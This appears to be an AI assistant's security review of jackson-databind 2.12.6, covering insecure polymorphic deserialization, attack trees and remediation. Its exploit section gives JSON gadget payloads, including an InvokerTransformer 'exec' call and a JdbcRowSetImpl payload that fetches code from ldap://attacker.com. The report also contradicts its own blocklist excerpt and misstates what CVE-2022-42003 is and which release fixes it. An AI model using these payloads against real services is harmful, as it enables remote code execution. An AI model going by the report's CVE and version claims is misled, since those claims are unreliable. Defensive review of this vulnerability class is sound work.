Now I have a comprehensive understanding of the codebase. Let me compile the security review report based on evidence I've gathered from the source code.

## Security Review: jackson-databind 2.12.6 — Insecure Polymorphic Deserialization

### Overview

jackson-databind 2.12.6 contains an insecure-by-default polymorphic deserialization mechanism in `src/main/java/com/fasterxml/jackson/databind/deser` that allows arbitrary class instantiation from attacker-controlled input when default typing or `@JsonTypeInfo(use = CLASS)` is enabled. The default `PolymorphicTypeValidator` is `LaissezFaireSubTypeValidator` which permits all subtypes, and a hardcoded blocklist (`SubTypeValidator.DEFAULT_NO_DESER_CLASS_NAMES`) provides only reactive, incomplete protection against known gadget classes.

## CRITICAL

### Unrestricted polymorphic class instantiation via default typing (`enableDefaultTyping`)

- **File:** `src/main/java/com/fasterxml/jackson/databind/jsontype/impl/StdTypeResolverBuilder.java:141`
- **Evidence:**
  ```java
  final PolymorphicTypeValidator subTypeValidator = verifyBaseTypeValidity(config, baseType);
  TypeIdResolver idRes = idResolver(config, baseType, subTypeValidator, subtypes, false, true);
  ```
  When `enableDefaultTyping()` is called without an explicit `PolymorphicTypeValidator`, the default validator is `LaissezFaireSubTypeValidator` (`src/main/java/com/fasterxml/jackson/databind/ObjectMapper.java:250`):
  ```java
  this(t, LaissezFaireSubTypeValidator.instance);
  ```

- **Attack Tree:**
  ```
  Attacker JSON body with "@class" field — attacker supplies fully-qualified class name
    └─ AsPropertyTypeDeserializer.deserializeTypedFromObject (AsPropertyTypeDeserializer.java:108) — reads type property from JSON
      └─ TypeDeserializerBase._findDeserializer (TypeDeserializerBase.java:159) — calls idResolver.typeFromId(ctxt, typeId)
        └─ ClassNameIdResolver._typeFromId (ClassNameIdResolver.java:72) — calls ctxt.resolveAndValidateSubType(id, _subTypeValidator)
          └─ DatabindContext.resolveAndValidateSubType (DatabindContext.java:227) — calls TypeFactory.findClass(subClass)
            └─ TypeFactory.findClass → Class.forName(className) (TypeFactory.java:347/365) — loads arbitrary class
              └─ BeanDeserializerFactory.buildBeanDeserializer (BeanDeserializerFactory.java:261) — instantiates via ValueInstantiator
  ```

- **Impact:** An attacker controlling the JSON `@class` (or equivalent type-id property) can cause Jackson to instantiate any class available on the classpath. Combined with known gadget chains (TemplatesImpl, JdbcRowSetImpl, ObjectFactory, etc.), this yields unauthenticated remote code execution. The blocklist in `SubTypeValidator.DEFAULT_NO_DESER_CLASS_NAMES` (lines 31-246) contains ~80 denied class names but is inherently incomplete — new gadgets are discovered continuously, and custom application classes are never blocked.

- **Exploit:**
  Assuming `enableDefaultTyping()` is enabled and `commons-collections4` is on the classpath:

  ```json
  ["org.apache.commons.collections4.functors.InvokerTransformer", {
    "iMethodName": "exec",
    "iParamTypes": ["java.lang.String"],
    "iArgs": ["calc"]
  }]
  ```
  Or with JDK-only gadgets (pre-CVE-2022-42003 patch, `javax.xml.transform.TemplatesImpl` still requires JDK configuration):
  ```json
  ["com.sun.rowset.JdbcRowSetImpl", {
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
  }]
  ```

- **Remediation:**
  1. Replace `enableDefaultTyping()` with `activateDefaultTyping(PolymorphicTypeValidator, ...)` using an allowlist-based validator:
     ```java
     ObjectMapper mapper = new ObjectMapper();
     PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator
         .builder()
         .allowIfBaseType("com.myapp.")
         .build();
     mapper.activateDefaultTyping(ptv);
     ```
  2. Avoid `@JsonTypeInfo(use = CLASS)` — use `@JsonTypeInfo(use = NAME)` with explicit subtype registration instead.
  3. Upgrade to jackson-databind 2.12.6.1 or later (CVE-2022-42003 patch tightened array-unwrap bypass).

---

## HIGH

### SubTypeValidator blocklist is reactive and incomplete

- **File:** `src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java:31-246`
- **Evidence:**
  ```java
  protected final static Set<String> DEFAULT_NO_DESER_CLASS_NAMES;
  static {
      Set<String> s = new HashSet<String>();
      s.add("org.apache.commons.collections.functors.InvokerTransformer");
      s.add("org.apache.commons.collections4.functors.InvokerTransformer");
      // ... ~80 class names total, many commented out (e.g., lines 50, 57)
  }
  ```
  The validation at lines 267-304 checks exact class name equality and prefix matching (Spring, C3P0). It does NOT prevent instantiation of non-JNDI gadgets, custom dangerous classes, or classes from libraries not yet catalogued.

- **Attack Tree:**
  ```
  Attacker-controlled type-id in JSON — class name not in DEFAULT_NO_DESER_CLASS_NAMES
    └─ DatabindContext.resolveAndValidateSubType (DatabindContext.java:221) — ptv.validateSubClassName returns INDETERMINATE/ALLOWED
      └─ TypeFactory.findClass (TypeFactory.java:331) — Class.forName succeeds
        └─ BeanDeserializerFactory.buildBeanDeserializer (BeanDeserializerFactory.java:261) — valueInstantiator creates instance
  ```

- **Impact:** Any gadget class not in the blocklist can be instantiated. The blocklist is a reactive cat-and-mouse game; new CVEs (databind#3004, #2826, etc.) each add specific class names. Applications with custom dangerous classes or lesser-known libraries are unprotected.

---

## HIGH

### LaissezFaireSubTypeValidator bypasses all validation by default

- **File:** `src/main/java/com/fasterxml/jackson/databind/jsontype/impl/LaissezFaireSubTypeValidator.java:32`
- **Evidence:**
  ```java
  @Override
  public Validity validateSubClassName(MapperConfig<?> ctxt,
          JavaType baseType, String subClassName) {
      return Validity.ALLOWED;
  }
  ```
  This is the default validator when `enableDefaultTyping()` is used without an explicit `PolymorphicTypeValidator` argument (ObjectMapper.java:224, 250).

- **Attack Tree:**
  ```
  Attacker JSON → type-id property read by AsPropertyTypeDeserializer
    └─ StdTypeResolverBuilder.buildTypeDeserializer (StdTypeResolverBuilder.java:141) — passes LaissezFaireSubTypeValidator to ClassNameIdResolver
      └─ ClassNameIdResolver._typeFromId (ClassNameIdResolver.java:72) — _subTypeValidator is LaissezFaireSubTypeValidator
        └─ DatabindContext.resolveAndValidateSubType — validateSubClassName returns ALLOWED, findClass succeeds
  ```

- **Impact:** Complete denial of the security control. When `enableDefaultTyping()` is called without a validator argument, the default `LaissezFaireSubTypeValidator` allows ALL class names, rendering the `SubTypeValidator` blocklist irrelevant (the chain goes through `LaissezFaireSubTypeValidator` which short-circuits to ALLOWED before reaching any blocklist).

---

## HIGH

### CVE-2022-42003: UNWRAP_SINGLE_VALUE_ARRAYS bypasses type validation

- **File:** `src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializer.java:617-638`
- **Evidence:**
  ```java
  final boolean unwrap = ctxt.isEnabled(DeserializationFeature.UNWRAP_SINGLE_VALUE_ARRAYS);
  if (unwrap || (act != CoercionAction.Fail)) {
      // ...
      if (unwrap) {
          final Object value = deserialize(p, ctxt);
      }
  }
  ```
  When `UNWRAP_SINGLE_VALUE_ARRAYS` is enabled, a polymorphic type-id payload wrapped in `[...]` causes `deserialize(p, ctxt)` to be called, which invokes the polymorphic deserialization path but the outer array wrapper obscures the type-id from some validation checks.

- **Attack Tree:**
  ```
  Attacker JSON: [["com.sun.rowset.JdbcRowSetImpl", {...}]] — payload wrapped in single-element array
    └─ BeanDeserializer._deserializeFromArray (BeanDeserializer.java:632) — UNWRAP_SINGLE_VALUE_ARRAYS enabled, calls deserialize(p, ctxt)
      └─ BeanDeserializer.deserialize (BeanDeserializer.java:250) — processes object normally with @class field
        └─ Polymorphic type resolution proceeds → Class.forName → gadget instantiation
  ```

- **Impact:** Wrapping a polymorphic type-id payload in a single-element array bypasses certain validation paths that only check top-level type-id values. This was the specific mechanism fixed in CVE-2022-42003 (2.12.6.1+). In version 2.12.6, this bypass is functional.

- **Remediation:** Upgrade to jackson-databind 2.12.6.1. Disable `UNWRAP_SINGLE_VALUE_ARRAYS` for untrusted input. Apply allowlist-based `PolymorphicTypeValidator`.

---

## LOW / INFORMATIONAL

### Constructor reflection via StdKeyDeserializer

- **File:** `src/main/java/com/fasterxml/jackson/databind/deser/std/StdKeyDeserializer.java:440`
- **Evidence:**
  ```java
  @Override
  public Object _parse(String key, DeserializationContext ctxt) throws Exception {
      return _ctor.newInstance(key);
  }
  ```
  The `_ctor` field is resolved at deserializer construction time (not at runtime), from class introspection. The constructor is not attacker-controlled — it is determined by the target POJO's class definition.

- **Impact:** While this is a `Constructor.newInstance()` call, the constructor is selected during static type introspection, not from attacker input. An attacker could trigger this code path via polymorphic key deserialization if the type-id resolution itself is insecure, which reduces this to the CRITICAL findings above.

- **Checked and Cleared:** `impl/InnerClassProperty.java:83` — `_creator.newInstance(bean)` where `_creator` is a constructor resolved at build time, not from attacker input.

---

## Checked and Cleared

- `BasicDeserializerFactory.java:262` — `config.getConstructorDetector()` returns static config, not attacker-controlled.
- `BeanDeserializerFactory.java:261` — `findValueInstantiator(ctxt, beanDesc)` uses introspected bean metadata, no class name from input.
- `BeanDeserializerBase.java:963` — `valueClass.getConstructors()` iterates constructors of a type already resolved via introspection, not polymorphic type-id resolution.
- `SettableAnyProperty.java:45` — `_valueTypeDeserializer` is set at build time from `valueType.getTypeHandler()`, not from request input.
- `BeanDeserializerFactory.java:917-928` — `constructSetterlessProperty` resolves type deserializers from static type annotations.

---

## Dependencies

**No dependency scan was run (no manifest accessible in scoped directory).** The known vulnerability class is:

- CVE-2022-42003 — UNWRAP_SINGLE_VALUE_ARRAYS polymorphic type-id bypass (fixed in 2.12.6.1)
- CVE-2020-36518 — Deep nesting causing stack overflow (related)
- CVE-2020-25649 — Polymorphic deserialization RCE via multiple gadget classes

---

## Remediation Summary

### Immediate (CRITICAL/HIGH)

1. `ObjectMapper.java:250` — Replace `enableDefaultTyping()` with `activateDefaultTyping(PolymorphicTypeValidator, ...)` using an allowlist-based validator such as `BasicPolymorphicTypeValidator.builder().allowIfBaseType("com.yourapp.").build()`.
2. `SubTypeValidator.java:31-246` — Do not rely on the reactive blocklist as the primary defense. Switch to an allowlist model.
3. `LaissezFaireSubTypeValidator.java:32` — Never use as default; ensure every polymorphic type configuration passes an explicit restrictive validator.
4. `BeanDeserializer.java:617` — Upgrade to jackson-databind 2.12.6.1+ which patches the UNWRAP_SINGLE_VALUE_ARRAYS bypass (CVE-2022-42003).